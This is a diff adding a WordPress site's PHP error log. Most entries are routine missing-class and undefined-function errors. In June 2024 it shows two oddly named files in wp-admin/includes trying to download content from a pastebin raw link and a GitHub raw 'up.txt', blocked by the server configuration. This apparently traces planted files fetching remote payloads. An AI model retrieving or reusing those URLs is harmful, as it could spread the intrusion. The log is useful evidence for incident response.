@@ -1,0 +1,114 @@
+[14-Oct-2021 21:18:26 UTC] PHP Fatal error:  Uncaught Error: Class 'WP_Filesystem_Base' not found in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-filesystem-ssh2.php:36
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-filesystem-ssh2.php on line 36
+[14-Oct-2021 21:20:48 UTC] PHP Warning:  Use of undefined constant ABSPATH - assumed 'ABSPATH' (this will throw an Error in a future version of PHP) in /home/wwwictacademypun/public_html/wp-admin/includes/template.php on line 12
+[14-Oct-2021 21:20:48 UTC] PHP Warning:  require_once(ABSPATHwp-admin/includes/class-walker-category-checklist.php): failed to open stream: No such file or directory in /home/wwwictacademypun/public_html/wp-admin/includes/template.php on line 12
+[14-Oct-2021 21:20:48 UTC] PHP Fatal error:  require_once(): Failed opening required 'ABSPATHwp-admin/includes/class-walker-category-checklist.php' (include_path='.:/opt/cpanel/ea-php73/root/usr/share/pear') in /home/wwwictacademypun/public_html/wp-admin/includes/template.php on line 12
+[15-Oct-2021 01:42:30 UTC] PHP Fatal error:  Uncaught Error: Class 'WP_List_Table' not found in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-plugins-list-table.php:18
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-plugins-list-table.php on line 18
+[15-Oct-2021 03:18:58 UTC] PHP Warning:  Use of undefined constant ABSPATH - assumed 'ABSPATH' (this will throw an Error in a future version of PHP) in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-upgrader.php on line 13
+[15-Oct-2021 03:18:58 UTC] PHP Warning:  require_once(ABSPATHwp-admin/includes/class-wp-upgrader-skin.php): failed to open stream: No such file or directory in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-upgrader.php on line 13
+[15-Oct-2021 03:18:58 UTC] PHP Fatal error:  require_once(): Failed opening required 'ABSPATHwp-admin/includes/class-wp-upgrader-skin.php' (include_path='.:/opt/cpanel/ea-php73/root/usr/share/pear') in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-upgrader.php on line 13
+[15-Oct-2021 03:50:50 UTC] PHP Fatal error:  Uncaught Error: Class 'WP_List_Table' not found in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-posts-list-table.php:18
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-posts-list-table.php on line 18
+[15-Oct-2021 04:07:16 UTC] PHP Fatal error:  Uncaught Error: Class 'WP_List_Table' not found in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-ms-users-list-table.php:18
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-ms-users-list-table.php on line 18
+[15-Oct-2021 05:59:21 UTC] PHP Fatal error:  Uncaught Error: Class 'WP_List_Table' not found in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-users-list-table.php:18
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-users-list-table.php on line 18
+[15-Oct-2021 06:39:32 UTC] PHP Fatal error:  Uncaught Error: Class 'WP_Upgrader' not found in /home/wwwictacademypun/public_html/wp-admin/includes/class-plugin-upgrader.php:21
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/class-plugin-upgrader.php on line 21
+[15-Oct-2021 06:44:07 UTC] PHP Fatal error:  Uncaught Error: Class 'WP_Filesystem_Base' not found in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-filesystem-ftpext.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-filesystem-ftpext.php on line 16
+[15-Oct-2021 08:22:19 UTC] PHP Fatal error:  Uncaught Error: Class 'WP_Upgrader' not found in /home/wwwictacademypun/public_html/wp-admin/includes/class-language-pack-upgrader.php:19
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/class-language-pack-upgrader.php on line 19
+[15-Oct-2021 08:38:29 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function add_action() in /home/wwwictacademypun/public_html/wp-admin/includes/admin-filters.php:11
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin-filters.php on line 11
+[27-Oct-2021 13:30:42 UTC] PHP Fatal error:  Uncaught Error: Class 'WP_Filesystem_Base' not found in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-filesystem-ftpsockets.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/class-wp-filesystem-ftpsockets.php on line 16
+[08-Jul-2023 10:01:11 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[08-Jul-2023 10:01:20 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[10-Jul-2023 15:42:12 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[10-Jul-2023 15:42:24 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[20-Jul-2023 09:31:44 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[06-Aug-2023 05:19:41 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[07-Aug-2023 07:52:09 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[07-Aug-2023 08:26:32 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[02-Sep-2023 19:02:24 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[04-Sep-2023 16:18:31 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[10-Sep-2023 06:05:18 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[10-Sep-2023 06:05:29 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[26-Sep-2023 18:55:09 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[26-Sep-2023 18:59:30 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
+[22-Jun-2024 12:44:40 UTC] PHP Warning:  file_get_contents(): https:// wrapper is disabled in the server configuration by allow_url_fopen=0 in /home/wwwictacademypun/public_html/wp-admin/includes/ucvobqzthb.php on line 13
+[22-Jun-2024 12:44:40 UTC] PHP Warning:  file_get_contents(https://pastebin.com/raw/NYwj9nzX): failed to open stream: no suitable wrapper could be found in /home/wwwictacademypun/public_html/wp-admin/includes/ucvobqzthb.php on line 13
+[22-Jun-2024 12:44:40 UTC] PHP Warning:  file_get_contents(): https:// wrapper is disabled in the server configuration by allow_url_fopen=0 in /home/wwwictacademypun/public_html/wp-admin/includes/ucvobqzthb.php on line 13
+[22-Jun-2024 12:44:40 UTC] PHP Warning:  file_get_contents(https://raw.githubusercontent.com/spacebin-org/Casper/main/up.txt): failed to open stream: no suitable wrapper could be found in /home/wwwictacademypun/public_html/wp-admin/includes/ucvobqzthb.php on line 13
+[22-Jun-2024 14:44:08 UTC] PHP Warning:  file_get_contents(): https:// wrapper is disabled in the server configuration by allow_url_fopen=0 in /home/wwwictacademypun/public_html/wp-admin/includes/jvhssytvlc.php on line 13
+[22-Jun-2024 14:44:09 UTC] PHP Warning:  file_get_contents(https://pastebin.com/raw/NYwj9nzX): failed to open stream: no suitable wrapper could be found in /home/wwwictacademypun/public_html/wp-admin/includes/jvhssytvlc.php on line 13
+[22-Jun-2024 14:44:09 UTC] PHP Warning:  file_get_contents(): https:// wrapper is disabled in the server configuration by allow_url_fopen=0 in /home/wwwictacademypun/public_html/wp-admin/includes/jvhssytvlc.php on line 13
+[22-Jun-2024 14:44:09 UTC] PHP Warning:  file_get_contents(https://raw.githubusercontent.com/spacebin-org/Casper/main/up.txt): failed to open stream: no suitable wrapper could be found in /home/wwwictacademypun/public_html/wp-admin/includes/jvhssytvlc.php on line 13
+[23-Jul-2024 08:12:11 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function load_textdomain() in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php:16
+Stack trace:
+#0 {main}
+  thrown in /home/wwwictacademypun/public_html/wp-admin/includes/admin.php on line 16
